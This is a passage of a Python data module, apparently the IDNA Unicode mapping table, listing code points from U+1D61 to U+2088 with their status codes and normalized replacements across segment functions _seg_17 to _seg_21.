\'\xcf\x86\'),\n    (0x1D61, \'M\', \'\xcf\x87\'),\n    (0x1D62, \'M\', \'i\'),\n    (0x1D63, \'M\', \'r\'),\n    (0x1D64, \'M\', \'u\'),\n    (0x1D65, \'M\', \'v\'),\n    (0x1D66, \'M\', \'\xce\xb2\'),\n    (0x1D67, \'M\', \'\xce\xb3\'),\n    (0x1D68, \'M\', \'\xcf\x81\'),\n    (0x1D69, \'M\', \'\xcf\x86\'),\n    (0x1D6A, \'M\', \'\xcf\x87\'),\n    (0x1D6B, \'V\'),\n    (0x1D78, \'M\', \'\xd0\xbd\'),\n    (0x1D79, \'V\'),\n    (0x1D9B, \'M\', \'\xc9\x92\'),\n    (0x1D9C, \'M\', \'c\'),\n    (0x1D9D, \'M\', \'\xc9\x95\'),\n    (0x1D9E, \'M\', \'\xc3\xb0\'),\n    (0x1D9F, \'M\', \'\xc9\x9c\'),\n    (0x1DA0, \'M\', \'f\'),\n    (0x1DA1, \'M\', \'\xc9\x9f\'),\n    (0x1DA2, \'M\', \'\xc9\xa1\'),\n    (0x1DA3, \'M\', \'\xc9\xa5\'),\n    (0x1DA4, \'M\', \'\xc9\xa8\'),\n    (0x1DA5, \'M\', \'\xc9\xa9\'),\n    (0x1DA6, \'M\', \'\xc9\xaa\'),\n    (0x1DA7, \'M\', \'\xe1\xb5\xbb\'),\n    (0x1DA8, \'M\', \'\xca\x9d\'),\n    (0x1DA9, \'M\', \'\xc9\xad\'),\n    (0x1DAA, \'M\', \'\xe1\xb6\x85\'),\n    (0x1DAB, \'M\', \'\xca\x9f\'),\n    (0x1DAC, \'M\', \'\xc9\xb1\'),\n    (0x1DAD, \'M\', \'\xc9\xb0\'),\n    (0x1DAE, \'M\', \'\xc9\xb2\'),\n    (0x1DAF, \'M\', \'\xc9\xb3\'),\n    (0x1DB0, \'M\', \'\xc9\xb4\'),\n    (0x1DB1, \'M\', \'\xc9\xb5\'),\n    (0x1DB2, \'M\', \'\xc9\xb8\'),\n    (0x1DB3, \'M\', \'\xca\x82\'),\n    (0x1DB4, \'M\', \'\xca\x83\'),\n    (0x1DB5, \'M\', \'\xc6\xab\'),\n    (0x1DB6, \'M\', \'\xca\x89\'),\n    (0x1DB7, \'M\', \'\xca\x8a\'),\n    (0x1DB8, \'M\', \'\xe1\xb4\x9c\'),\n    (0x1DB9, \'M\', \'\xca\x8b\'),\n    (0x1DBA, \'M\', \'\xca\x8c\'),\n    (0x1DBB, \'M\', \'z\'),\n    (0x1DBC, \'M\', \'\xca\x90\'),\n    (0x1DBD, \'M\', \'\xca\x91\'),\n    (0x1DBE, \'M\', \'\xca\x92\'),\n    (0x1DBF, \'M\', \'\xce\xb8\'),\n    (0x1DC0, \'V\'),\n    (0x1E00, \'M\', \'\xe1\xb8\x81\'),\n    (0x1E01, \'V\'),\n    (0x1E02, \'M\', \'\xe1\xb8\x83\'),\n    (0x1E03, \'V\'),\n    (0x1E04, \'M\', \'\xe1\xb8\x85\'),\n    (0x1E05, \'V\'),\n    (0x1E06, \'M\', \'\xe1\xb8\x87\'),\n    (0x1E07, \'V\'),\n    (0x1E08, \'M\', \'\xe1\xb8\x89\'),\n    (0x1E09, \'V\'),\n    (0x1E0A, \'M\', \'\xe1\xb8\x8b\'),\n    (0x1E0B, \'V\'),\n    (0x1E0C, \'M\', \'\xe1\xb8\x8d\'),\n    (0x1E0D, \'V\'),\n    (0x1E0E, \'M\', \'\xe1\xb8\x8f\'),\n    (0x1E0F, \'V\'),\n    (0x1E10, \'M\', \'\xe1\xb8\x91\'),\n    (0x1E11, \'V\'),\n    (0x1E12, \'M\', \'\xe1\xb8\x93\'),\n    (0x1E13, \'V\'),\n    (0x1E14, \'M\', \'\xe1\xb8\x95\'),\n    (0x1E15, \'V\'),\n    (0x1E16, \'M\', \'\xe1\xb8\x97\'),\n    (0x1E17, \'V\'),\n    (0x1E18, \'M\', \'\xe1\xb8\x99\'),\n    (0x1E19, \'V\'),\n    (0x1E1A, \'M\', \'\xe1\xb8\x9b\'),\n    (0x1E1B, \'V\'),\n    (0x1E1C, \'M\', \'\xe1\xb8\x9d\'),\n    (0x1E1D, \'V\'),\n    (0x1E1E, \'M\', \'\xe1\xb8\x9f\'),\n    (0x1E1F, \'V\'),\n    (0x1E20, \'M\', \'\xe1\xb8\xa1\'),\n    (0x1E21, \'V\'),\n    (0x1E22, \'M\', \'\xe1\xb8\xa3\'),\n    (0x1E23, \'V\'),\n    ]\n\ndef _seg_17() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1E24, \'M\', \'\xe1\xb8\xa5\'),\n    (0x1E25, \'V\'),\n    (0x1E26, \'M\', \'\xe1\xb8\xa7\'),\n    (0x1E27, \'V\'),\n    (0x1E28, \'M\', \'\xe1\xb8\xa9\'),\n    (0x1E29, \'V\'),\n    (0x1E2A, \'M\', \'\xe1\xb8\xab\'),\n    (0x1E2B, \'V\'),\n    (0x1E2C, \'M\', \'\xe1\xb8\xad\'),\n    (0x1E2D, \'V\'),\n    (0x1E2E, \'M\', \'\xe1\xb8\xaf\'),\n    (0x1E2F, \'V\'),\n    (0x1E30, \'M\', \'\xe1\xb8\xb1\'),\n    (0x1E31, \'V\'),\n    (0x1E32, \'M\', \'\xe1\xb8\xb3\'),\n    (0x1E33, \'V\'),\n    (0x1E34, \'M\', \'\xe1\xb8\xb5\'),\n    (0x1E35, \'V\'),\n    (0x1E36, \'M\', \'\xe1\xb8\xb7\'),\n    (0x1E37, \'V\'),\n    (0x1E38, \'M\', \'\xe1\xb8\xb9\'),\n    (0x1E39, \'V\'),\n    (0x1E3A, \'M\', \'\xe1\xb8\xbb\'),\n    (0x1E3B, \'V\'),\n    (0x1E3C, \'M\', \'\xe1\xb8\xbd\'),\n    (0x1E3D, \'V\'),\n    (0x1E3E, \'M\', \'\xe1\xb8\xbf\'),\n    (0x1E3F, \'V\'),\n    (0x1E40, \'M\', \'\xe1\xb9\x81\'),\n    (0x1E41, \'V\'),\n    (0x1E42, \'M\', \'\xe1\xb9\x83\'),\n    (0x1E43, \'V\'),\n    (0x1E44, \'M\', \'\xe1\xb9\x85\'),\n    (0x1E45, \'V\'),\n    (0x1E46, \'M\', \'\xe1\xb9\x87\'),\n    (0x1E47, \'V\'),\n    (0x1E48, \'M\', \'\xe1\xb9\x89\'),\n    (0x1E49, \'V\'),\n    (0x1E4A, \'M\', \'\xe1\xb9\x8b\'),\n    (0x1E4B, \'V\'),\n    (0x1E4C, \'M\', \'\xe1\xb9\x8d\'),\n    (0x1E4D, \'V\'),\n    (0x1E4E, \'M\', \'\xe1\xb9\x8f\'),\n    (0x1E4F, \'V\'),\n    (0x1E50, \'M\', \'\xe1\xb9\x91\'),\n    (0x1E51, \'V\'),\n    (0x1E52, \'M\', \'\xe1\xb9\x93\'),\n    (0x1E53, \'V\'),\n    (0x1E54, \'M\', \'\xe1\xb9\x95\'),\n    (0x1E55, \'V\'),\n    (0x1E56, \'M\', \'\xe1\xb9\x97\'),\n    (0x1E57, \'V\'),\n    (0x1E58, \'M\', \'\xe1\xb9\x99\'),\n    (0x1E59, \'V\'),\n    (0x1E5A, \'M\', \'\xe1\xb9\x9b\'),\n    (0x1E5B, \'V\'),\n    (0x1E5C, \'M\', \'\xe1\xb9\x9d\'),\n    (0x1E5D, \'V\'),\n    (0x1E5E, \'M\', \'\xe1\xb9\x9f\'),\n    (0x1E5F, \'V\'),\n    (0x1E60, \'M\', \'\xe1\xb9\xa1\'),\n    (0x1E61, \'V\'),\n    (0x1E62, \'M\', \'\xe1\xb9\xa3\'),\n    (0x1E63, \'V\'),\n    (0x1E64, \'M\', \'\xe1\xb9\xa5\'),\n    (0x1E65, \'V\'),\n    (0x1E66, \'M\', \'\xe1\xb9\xa7\'),\n    (0x1E67, \'V\'),\n    (0x1E68, \'M\', \'\xe1\xb9\xa9\'),\n    (0x1E69, \'V\'),\n    (0x1E6A, \'M\', \'\xe1\xb9\xab\'),\n    (0x1E6B, \'V\'),\n    (0x1E6C, \'M\', \'\xe1\xb9\xad\'),\n    (0x1E6D, \'V\'),\n    (0x1E6E, \'M\', \'\xe1\xb9\xaf\'),\n    (0x1E6F, \'V\'),\n    (0x1E70, \'M\', \'\xe1\xb9\xb1\'),\n    (0x1E71, \'V\'),\n    (0x1E72, \'M\', \'\xe1\xb9\xb3\'),\n    (0x1E73, \'V\'),\n    (0x1E74, \'M\', \'\xe1\xb9\xb5\'),\n    (0x1E75, \'V\'),\n    (0x1E76, \'M\', \'\xe1\xb9\xb7\'),\n    (0x1E77, \'V\'),\n    (0x1E78, \'M\', \'\xe1\xb9\xb9\'),\n    (0x1E79, \'V\'),\n    (0x1E7A, \'M\', \'\xe1\xb9\xbb\'),\n    (0x1E7B, \'V\'),\n    (0x1E7C, \'M\', \'\xe1\xb9\xbd\'),\n    (0x1E7D, \'V\'),\n    (0x1E7E, \'M\', \'\xe1\xb9\xbf\'),\n    (0x1E7F, \'V\'),\n    (0x1E80, \'M\', \'\xe1\xba\x81\'),\n    (0x1E81, \'V\'),\n    (0x1E82, \'M\', \'\xe1\xba\x83\'),\n    (0x1E83, \'V\'),\n    (0x1E84, \'M\', \'\xe1\xba\x85\'),\n    (0x1E85, \'V\'),\n    (0x1E86, \'M\', \'\xe1\xba\x87\'),\n    (0x1E87, \'V\'),\n    ]\n\ndef _seg_18() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1E88, \'M\', \'\xe1\xba\x89\'),\n    (0x1E89, \'V\'),\n    (0x1E8A, \'M\', \'\xe1\xba\x8b\'),\n    (0x1E8B, \'V\'),\n    (0x1E8C, \'M\', \'\xe1\xba\x8d\'),\n    (0x1E8D, \'V\'),\n    (0x1E8E, \'M\', \'\xe1\xba\x8f\'),\n    (0x1E8F, \'V\'),\n    (0x1E90, \'M\', \'\xe1\xba\x91\'),\n    (0x1E91, \'V\'),\n    (0x1E92, \'M\', \'\xe1\xba\x93\'),\n    (0x1E93, \'V\'),\n    (0x1E94, \'M\', \'\xe1\xba\x95\'),\n    (0x1E95, \'V\'),\n    (0x1E9A, \'M\', \'a\xca\xbe\'),\n    (0x1E9B, \'M\', \'\xe1\xb9\xa1\'),\n    (0x1E9C, \'V\'),\n    (0x1E9E, \'M\', \'ss\'),\n    (0x1E9F, \'V\'),\n    (0x1EA0, \'M\', \'\xe1\xba\xa1\'),\n    (0x1EA1, \'V\'),\n    (0x1EA2, \'M\', \'\xe1\xba\xa3\'),\n    (0x1EA3, \'V\'),\n    (0x1EA4, \'M\', \'\xe1\xba\xa5\'),\n    (0x1EA5, \'V\'),\n    (0x1EA6, \'M\', \'\xe1\xba\xa7\'),\n    (0x1EA7, \'V\'),\n    (0x1EA8, \'M\', \'\xe1\xba\xa9\'),\n    (0x1EA9, \'V\'),\n    (0x1EAA, \'M\', \'\xe1\xba\xab\'),\n    (0x1EAB, \'V\'),\n    (0x1EAC, \'M\', \'\xe1\xba\xad\'),\n    (0x1EAD, \'V\'),\n    (0x1EAE, \'M\', \'\xe1\xba\xaf\'),\n    (0x1EAF, \'V\'),\n    (0x1EB0, \'M\', \'\xe1\xba\xb1\'),\n    (0x1EB1, \'V\'),\n    (0x1EB2, \'M\', \'\xe1\xba\xb3\'),\n    (0x1EB3, \'V\'),\n    (0x1EB4, \'M\', \'\xe1\xba\xb5\'),\n    (0x1EB5, \'V\'),\n    (0x1EB6, \'M\', \'\xe1\xba\xb7\'),\n    (0x1EB7, \'V\'),\n    (0x1EB8, \'M\', \'\xe1\xba\xb9\'),\n    (0x1EB9, \'V\'),\n    (0x1EBA, \'M\', \'\xe1\xba\xbb\'),\n    (0x1EBB, \'V\'),\n    (0x1EBC, \'M\', \'\xe1\xba\xbd\'),\n    (0x1EBD, \'V\'),\n    (0x1EBE, \'M\', \'\xe1\xba\xbf\'),\n    (0x1EBF, \'V\'),\n    (0x1EC0, \'M\', \'\xe1\xbb\x81\'),\n    (0x1EC1, \'V\'),\n    (0x1EC2, \'M\', \'\xe1\xbb\x83\'),\n    (0x1EC3, \'V\'),\n    (0x1EC4, \'M\', \'\xe1\xbb\x85\'),\n    (0x1EC5, \'V\'),\n    (0x1EC6, \'M\', \'\xe1\xbb\x87\'),\n    (0x1EC7, \'V\'),\n    (0x1EC8, \'M\', \'\xe1\xbb\x89\'),\n    (0x1EC9, \'V\'),\n    (0x1ECA, \'M\', \'\xe1\xbb\x8b\'),\n    (0x1ECB, \'V\'),\n    (0x1ECC, \'M\', \'\xe1\xbb\x8d\'),\n    (0x1ECD, \'V\'),\n    (0x1ECE, \'M\', \'\xe1\xbb\x8f\'),\n    (0x1ECF, \'V\'),\n    (0x1ED0, \'M\', \'\xe1\xbb\x91\'),\n    (0x1ED1, \'V\'),\n    (0x1ED2, \'M\', \'\xe1\xbb\x93\'),\n    (0x1ED3, \'V\'),\n    (0x1ED4, \'M\', \'\xe1\xbb\x95\'),\n    (0x1ED5, \'V\'),\n    (0x1ED6, \'M\', \'\xe1\xbb\x97\'),\n    (0x1ED7, \'V\'),\n    (0x1ED8, \'M\', \'\xe1\xbb\x99\'),\n    (0x1ED9, \'V\'),\n    (0x1EDA, \'M\', \'\xe1\xbb\x9b\'),\n    (0x1EDB, \'V\'),\n    (0x1EDC, \'M\', \'\xe1\xbb\x9d\'),\n    (0x1EDD, \'V\'),\n    (0x1EDE, \'M\', \'\xe1\xbb\x9f\'),\n    (0x1EDF, \'V\'),\n    (0x1EE0, \'M\', \'\xe1\xbb\xa1\'),\n    (0x1EE1, \'V\'),\n    (0x1EE2, \'M\', \'\xe1\xbb\xa3\'),\n    (0x1EE3, \'V\'),\n    (0x1EE4, \'M\', \'\xe1\xbb\xa5\'),\n    (0x1EE5, \'V\'),\n    (0x1EE6, \'M\', \'\xe1\xbb\xa7\'),\n    (0x1EE7, \'V\'),\n    (0x1EE8, \'M\', \'\xe1\xbb\xa9\'),\n    (0x1EE9, \'V\'),\n    (0x1EEA, \'M\', \'\xe1\xbb\xab\'),\n    (0x1EEB, \'V\'),\n    (0x1EEC, \'M\', \'\xe1\xbb\xad\'),\n    (0x1EED, \'V\'),\n    (0x1EEE, \'M\', \'\xe1\xbb\xaf\'),\n    (0x1EEF, \'V\'),\n    (0x1EF0, \'M\', \'\xe1\xbb\xb1\'),\n    ]\n\ndef _seg_19() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1EF1, \'V\'),\n    (0x1EF2, \'M\', \'\xe1\xbb\xb3\'),\n    (0x1EF3, \'V\'),\n    (0x1EF4, \'M\', \'\xe1\xbb\xb5\'),\n    (0x1EF5, \'V\'),\n    (0x1EF6, \'M\', \'\xe1\xbb\xb7\'),\n    (0x1EF7, \'V\'),\n    (0x1EF8, \'M\', \'\xe1\xbb\xb9\'),\n    (0x1EF9, \'V\'),\n    (0x1EFA, \'M\', \'\xe1\xbb\xbb\'),\n    (0x1EFB, \'V\'),\n    (0x1EFC, \'M\', \'\xe1\xbb\xbd\'),\n    (0x1EFD, \'V\'),\n    (0x1EFE, \'M\', \'\xe1\xbb\xbf\'),\n    (0x1EFF, \'V\'),\n    (0x1F08, \'M\', \'\xe1\xbc\x80\'),\n    (0x1F09, \'M\', \'\xe1\xbc\x81\'),\n    (0x1F0A, \'M\', \'\xe1\xbc\x82\'),\n    (0x1F0B, \'M\', \'\xe1\xbc\x83\'),\n    (0x1F0C, \'M\', \'\xe1\xbc\x84\'),\n    (0x1F0D, \'M\', \'\xe1\xbc\x85\'),\n    (0x1F0E, \'M\', \'\xe1\xbc\x86\'),\n    (0x1F0F, \'M\', \'\xe1\xbc\x87\'),\n    (0x1F10, \'V\'),\n    (0x1F16, \'X\'),\n    (0x1F18, \'M\', \'\xe1\xbc\x90\'),\n    (0x1F19, \'M\', \'\xe1\xbc\x91\'),\n    (0x1F1A, \'M\', \'\xe1\xbc\x92\'),\n    (0x1F1B, \'M\', \'\xe1\xbc\x93\'),\n    (0x1F1C, \'M\', \'\xe1\xbc\x94\'),\n    (0x1F1D, \'M\', \'\xe1\xbc\x95\'),\n    (0x1F1E, \'X\'),\n    (0x1F20, \'V\'),\n    (0x1F28, \'M\', \'\xe1\xbc\xa0\'),\n    (0x1F29, \'M\', \'\xe1\xbc\xa1\'),\n    (0x1F2A, \'M\', \'\xe1\xbc\xa2\'),\n    (0x1F2B, \'M\', \'\xe1\xbc\xa3\'),\n    (0x1F2C, \'M\', \'\xe1\xbc\xa4\'),\n    (0x1F2D, \'M\', \'\xe1\xbc\xa5\'),\n    (0x1F2E, \'M\', \'\xe1\xbc\xa6\'),\n    (0x1F2F, \'M\', \'\xe1\xbc\xa7\'),\n    (0x1F30, \'V\'),\n    (0x1F38, \'M\', \'\xe1\xbc\xb0\'),\n    (0x1F39, \'M\', \'\xe1\xbc\xb1\'),\n    (0x1F3A, \'M\', \'\xe1\xbc\xb2\'),\n    (0x1F3B, \'M\', \'\xe1\xbc\xb3\'),\n    (0x1F3C, \'M\', \'\xe1\xbc\xb4\'),\n    (0x1F3D, \'M\', \'\xe1\xbc\xb5\'),\n    (0x1F3E, \'M\', \'\xe1\xbc\xb6\'),\n    (0x1F3F, \'M\', \'\xe1\xbc\xb7\'),\n    (0x1F40, \'V\'),\n    (0x1F46, \'X\'),\n    (0x1F48, \'M\', \'\xe1\xbd\x80\'),\n    (0x1F49, \'M\', \'\xe1\xbd\x81\'),\n    (0x1F4A, \'M\', \'\xe1\xbd\x82\'),\n    (0x1F4B, \'M\', \'\xe1\xbd\x83\'),\n    (0x1F4C, \'M\', \'\xe1\xbd\x84\'),\n    (0x1F4D, \'M\', \'\xe1\xbd\x85\'),\n    (0x1F4E, \'X\'),\n    (0x1F50, \'V\'),\n    (0x1F58, \'X\'),\n    (0x1F59, \'M\', \'\xe1\xbd\x91\'),\n    (0x1F5A, \'X\'),\n    (0x1F5B, \'M\', \'\xe1\xbd\x93\'),\n    (0x1F5C, \'X\'),\n    (0x1F5D, \'M\', \'\xe1\xbd\x95\'),\n    (0x1F5E, \'X\'),\n    (0x1F5F, \'M\', \'\xe1\xbd\x97\'),\n    (0x1F60, \'V\'),\n    (0x1F68, \'M\', \'\xe1\xbd\xa0\'),\n    (0x1F69, \'M\', \'\xe1\xbd\xa1\'),\n    (0x1F6A, \'M\', \'\xe1\xbd\xa2\'),\n    (0x1F6B, \'M\', \'\xe1\xbd\xa3\'),\n    (0x1F6C, \'M\', \'\xe1\xbd\xa4\'),\n    (0x1F6D, \'M\', \'\xe1\xbd\xa5\'),\n    (0x1F6E, \'M\', \'\xe1\xbd\xa6\'),\n    (0x1F6F, \'M\', \'\xe1\xbd\xa7\'),\n    (0x1F70, \'V\'),\n    (0x1F71, \'M\', \'\xce\xac\'),\n    (0x1F72, \'V\'),\n    (0x1F73, \'M\', \'\xce\xad\'),\n    (0x1F74, \'V\'),\n    (0x1F75, \'M\', \'\xce\xae\'),\n    (0x1F76, \'V\'),\n    (0x1F77, \'M\', \'\xce\xaf\'),\n    (0x1F78, \'V\'),\n    (0x1F79, \'M\', \'\xcf\x8c\'),\n    (0x1F7A, \'V\'),\n    (0x1F7B, \'M\', \'\xcf\x8d\'),\n    (0x1F7C, \'V\'),\n    (0x1F7D, \'M\', \'\xcf\x8e\'),\n    (0x1F7E, \'X\'),\n    (0x1F80, \'M\', \'\xe1\xbc\x80\xce\xb9\'),\n    (0x1F81, \'M\', \'\xe1\xbc\x81\xce\xb9\'),\n    (0x1F82, \'M\', \'\xe1\xbc\x82\xce\xb9\'),\n    (0x1F83, \'M\', \'\xe1\xbc\x83\xce\xb9\'),\n    (0x1F84, \'M\', \'\xe1\xbc\x84\xce\xb9\'),\n    (0x1F85, \'M\', \'\xe1\xbc\x85\xce\xb9\'),\n    (0x1F86, \'M\', \'\xe1\xbc\x86\xce\xb9\'),\n    (0x1F87, \'M\', \'\xe1\xbc\x87\xce\xb9\'),\n    ]\n\ndef _seg_20() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1F88, \'M\', \'\xe1\xbc\x80\xce\xb9\'),\n    (0x1F89, \'M\', \'\xe1\xbc\x81\xce\xb9\'),\n    (0x1F8A, \'M\', \'\xe1\xbc\x82\xce\xb9\'),\n    (0x1F8B, \'M\', \'\xe1\xbc\x83\xce\xb9\'),\n    (0x1F8C, \'M\', \'\xe1\xbc\x84\xce\xb9\'),\n    (0x1F8D, \'M\', \'\xe1\xbc\x85\xce\xb9\'),\n    (0x1F8E, \'M\', \'\xe1\xbc\x86\xce\xb9\'),\n    (0x1F8F, \'M\', \'\xe1\xbc\x87\xce\xb9\'),\n    (0x1F90, \'M\', \'\xe1\xbc\xa0\xce\xb9\'),\n    (0x1F91, \'M\', \'\xe1\xbc\xa1\xce\xb9\'),\n    (0x1F92, \'M\', \'\xe1\xbc\xa2\xce\xb9\'),\n    (0x1F93, \'M\', \'\xe1\xbc\xa3\xce\xb9\'),\n    (0x1F94, \'M\', \'\xe1\xbc\xa4\xce\xb9\'),\n    (0x1F95, \'M\', \'\xe1\xbc\xa5\xce\xb9\'),\n    (0x1F96, \'M\', \'\xe1\xbc\xa6\xce\xb9\'),\n    (0x1F97, \'M\', \'\xe1\xbc\xa7\xce\xb9\'),\n    (0x1F98, \'M\', \'\xe1\xbc\xa0\xce\xb9\'),\n    (0x1F99, \'M\', \'\xe1\xbc\xa1\xce\xb9\'),\n    (0x1F9A, \'M\', \'\xe1\xbc\xa2\xce\xb9\'),\n    (0x1F9B, \'M\', \'\xe1\xbc\xa3\xce\xb9\'),\n    (0x1F9C, \'M\', \'\xe1\xbc\xa4\xce\xb9\'),\n    (0x1F9D, \'M\', \'\xe1\xbc\xa5\xce\xb9\'),\n    (0x1F9E, \'M\', \'\xe1\xbc\xa6\xce\xb9\'),\n    (0x1F9F, \'M\', \'\xe1\xbc\xa7\xce\xb9\'),\n    (0x1FA0, \'M\', \'\xe1\xbd\xa0\xce\xb9\'),\n    (0x1FA1, \'M\', \'\xe1\xbd\xa1\xce\xb9\'),\n    (0x1FA2, \'M\', \'\xe1\xbd\xa2\xce\xb9\'),\n    (0x1FA3, \'M\', \'\xe1\xbd\xa3\xce\xb9\'),\n    (0x1FA4, \'M\', \'\xe1\xbd\xa4\xce\xb9\'),\n    (0x1FA5, \'M\', \'\xe1\xbd\xa5\xce\xb9\'),\n    (0x1FA6, \'M\', \'\xe1\xbd\xa6\xce\xb9\'),\n    (0x1FA7, \'M\', \'\xe1\xbd\xa7\xce\xb9\'),\n    (0x1FA8, \'M\', \'\xe1\xbd\xa0\xce\xb9\'),\n    (0x1FA9, \'M\', \'\xe1\xbd\xa1\xce\xb9\'),\n    (0x1FAA, \'M\', \'\xe1\xbd\xa2\xce\xb9\'),\n    (0x1FAB, \'M\', \'\xe1\xbd\xa3\xce\xb9\'),\n    (0x1FAC, \'M\', \'\xe1\xbd\xa4\xce\xb9\'),\n    (0x1FAD, \'M\', \'\xe1\xbd\xa5\xce\xb9\'),\n    (0x1FAE, \'M\', \'\xe1\xbd\xa6\xce\xb9\'),\n    (0x1FAF, \'M\', \'\xe1\xbd\xa7\xce\xb9\'),\n    (0x1FB0, \'V\'),\n    (0x1FB2, \'M\', \'\xe1\xbd\xb0\xce\xb9\'),\n    (0x1FB3, \'M\', \'\xce\xb1\xce\xb9\'),\n    (0x1FB4, \'M\', \'\xce\xac\xce\xb9\'),\n    (0x1FB5, \'X\'),\n    (0x1FB6, \'V\'),\n    (0x1FB7, \'M\', \'\xe1\xbe\xb6\xce\xb9\'),\n    (0x1FB8, \'M\', \'\xe1\xbe\xb0\'),\n    (0x1FB9, \'M\', \'\xe1\xbe\xb1\'),\n    (0x1FBA, \'M\', \'\xe1\xbd\xb0\'),\n    (0x1FBB, \'M\', \'\xce\xac\'),\n    (0x1FBC, \'M\', \'\xce\xb1\xce\xb9\'),\n    (0x1FBD, \'3\', \' \xcc\x93\'),\n    (0x1FBE, \'M\', \'\xce\xb9\'),\n    (0x1FBF, \'3\', \' \xcc\x93\'),\n    (0x1FC0, \'3\', \' \xcd\x82\'),\n    (0x1FC1, \'3\', \' \xcc\x88\xcd\x82\'),\n    (0x1FC2, \'M\', \'\xe1\xbd\xb4\xce\xb9\'),\n    (0x1FC3, \'M\', \'\xce\xb7\xce\xb9\'),\n    (0x1FC4, \'M\', \'\xce\xae\xce\xb9\'),\n    (0x1FC5, \'X\'),\n    (0x1FC6, \'V\'),\n    (0x1FC7, \'M\', \'\xe1\xbf\x86\xce\xb9\'),\n    (0x1FC8, \'M\', \'\xe1\xbd\xb2\'),\n    (0x1FC9, \'M\', \'\xce\xad\'),\n    (0x1FCA, \'M\', \'\xe1\xbd\xb4\'),\n    (0x1FCB, \'M\', \'\xce\xae\'),\n    (0x1FCC, \'M\', \'\xce\xb7\xce\xb9\'),\n    (0x1FCD, \'3\', \' \xcc\x93\xcc\x80\'),\n    (0x1FCE, \'3\', \' \xcc\x93\xcc\x81\'),\n    (0x1FCF, \'3\', \' \xcc\x93\xcd\x82\'),\n    (0x1FD0, \'V\'),\n    (0x1FD3, \'M\', \'\xce\x90\'),\n    (0x1FD4, \'X\'),\n    (0x1FD6, \'V\'),\n    (0x1FD8, \'M\', \'\xe1\xbf\x90\'),\n    (0x1FD9, \'M\', \'\xe1\xbf\x91\'),\n    (0x1FDA, \'M\', \'\xe1\xbd\xb6\'),\n    (0x1FDB, \'M\', \'\xce\xaf\'),\n    (0x1FDC, \'X\'),\n    (0x1FDD, \'3\', \' \xcc\x94\xcc\x80\'),\n    (0x1FDE, \'3\', \' \xcc\x94\xcc\x81\'),\n    (0x1FDF, \'3\', \' \xcc\x94\xcd\x82\'),\n    (0x1FE0, \'V\'),\n    (0x1FE3, \'M\', \'\xce\xb0\'),\n    (0x1FE4, \'V\'),\n    (0x1FE8, \'M\', \'\xe1\xbf\xa0\'),\n    (0x1FE9, \'M\', \'\xe1\xbf\xa1\'),\n    (0x1FEA, \'M\', \'\xe1\xbd\xba\'),\n    (0x1FEB, \'M\', \'\xcf\x8d\'),\n    (0x1FEC, \'M\', \'\xe1\xbf\xa5\'),\n    (0x1FED, \'3\', \' \xcc\x88\xcc\x80\'),\n    (0x1FEE, \'3\', \' \xcc\x88\xcc\x81\'),\n    (0x1FEF, \'3\', \'`\'),\n    (0x1FF0, \'X\'),\n    (0x1FF2, \'M\', \'\xe1\xbd\xbc\xce\xb9\'),\n    (0x1FF3, \'M\', \'\xcf\x89\xce\xb9\'),\n    (0x1FF4, \'M\', \'\xcf\x8e\xce\xb9\'),\n    (0x1FF5, \'X\'),\n    (0x1FF6, \'V\'),\n    ]\n\ndef _seg_21() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1FF7, \'M\', \'\xe1\xbf\xb6\xce\xb9\'),\n    (0x1FF8, \'M\', \'\xe1\xbd\xb8\'),\n    (0x1FF9, \'M\', \'\xcf\x8c\'),\n    (0x1FFA, \'M\', \'\xe1\xbd\xbc\'),\n    (0x1FFB, \'M\', \'\xcf\x8e\'),\n    (0x1FFC, \'M\', \'\xcf\x89\xce\xb9\'),\n    (0x1FFD, \'3\', \' \xcc\x81\'),\n    (0x1FFE, \'3\', \' \xcc\x94\'),\n    (0x1FFF, \'X\'),\n    (0x2000, \'3\', \' \'),\n    (0x200B, \'I\'),\n    (0x200C, \'D\', \'\'),\n    (0x200E, \'X\'),\n    (0x2010, \'V\'),\n    (0x2011, \'M\', \'\xe2\x80\x90\'),\n    (0x2012, \'V\'),\n    (0x2017, \'3\', \' \xcc\xb3\'),\n    (0x2018, \'V\'),\n    (0x2024, \'X\'),\n    (0x2027, \'V\'),\n    (0x2028, \'X\'),\n    (0x202F, \'3\', \' \'),\n    (0x2030, \'V\'),\n    (0x2033, \'M\', \'\xe2\x80\xb2\xe2\x80\xb2\'),\n    (0x2034, \'M\', \'\xe2\x80\xb2\xe2\x80\xb2\xe2\x80\xb2\'),\n    (0x2035, \'V\'),\n    (0x2036, \'M\', \'\xe2\x80\xb5\xe2\x80\xb5\'),\n    (0x2037, \'M\', \'\xe2\x80\xb5\xe2\x80\xb5\xe2\x80\xb5\'),\n    (0x2038, \'V\'),\n    (0x203C, \'3\', \'!!\'),\n    (0x203D, \'V\'),\n    (0x203E, \'3\', \' \xcc\x85\'),\n    (0x203F, \'V\'),\n    (0x2047, \'3\', \'??\'),\n    (0x2048, \'3\', \'?!\'),\n    (0x2049, \'3\', \'!?\'),\n    (0x204A, \'V\'),\n    (0x2057, \'M\', \'\xe2\x80\xb2\xe2\x80\xb2\xe2\x80\xb2\xe2\x80\xb2\'),\n    (0x2058, \'V\'),\n    (0x205F, \'3\', \' \'),\n    (0x2060, \'I\'),\n    (0x2061, \'X\'),\n    (0x2064, \'I\'),\n    (0x2065, \'X\'),\n    (0x2070, \'M\', \'0\'),\n    (0x2071, \'M\', \'i\'),\n    (0x2072, \'X\'),\n    (0x2074, \'M\', \'4\'),\n    (0x2075, \'M\', \'5\'),\n    (0x2076, \'M\', \'6\'),\n    (0x2077, \'M\', \'7\'),\n    (0x2078, \'M\', \'8\'),\n    (0x2079, \'M\', \'9\'),\n    (0x207A, \'3\', \'+\'),\n    (0x207B, \'M\', \'\xe2\x88\x92\'),\n    (0x207C, \'3\', \'=\'),\n    (0x207D, \'3\', \'(\'),\n    (0x207E, \'3\', \')\'),\n    (0x207F, \'M\', \'n\'),\n    (0x2080, \'M\', \'0\'),\n    (0x2081, \'M\', \'1\'),\n    (0x2082, \'M\', \'2\'),\n    (0x2083, \'M\', \'3\'),\n    (0x2084, \'M\', \'4\'),\n    (0x2085, \'M\', \'5\'),\n    (0x2086, \'M\', \'6\'),\n    (0x2087, \'M\', \'7\'),\n    (0x2088, \'M\', 